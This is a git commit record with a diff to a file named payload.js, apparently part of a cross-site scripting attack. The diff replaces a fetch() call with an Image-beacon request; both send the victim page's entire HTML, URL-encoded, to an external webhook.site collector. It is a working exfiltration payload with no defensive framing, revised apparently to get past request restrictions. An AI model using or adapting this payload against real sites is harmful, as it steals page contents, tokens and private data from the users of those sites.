f790d4464a868751d10bcd9d7581640713d8aa41
rishaldwivedi <rishal.dwivedi@gmail.com>
2025-06-25 05:02:32 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,2 @@
-fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?dump=" + encodeURIComponent(document.documentElement.innerHTML));
+var i = new Image();
+i.src = "https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?dump=" + encodeURIComponent(document.documentElement.innerHTML);
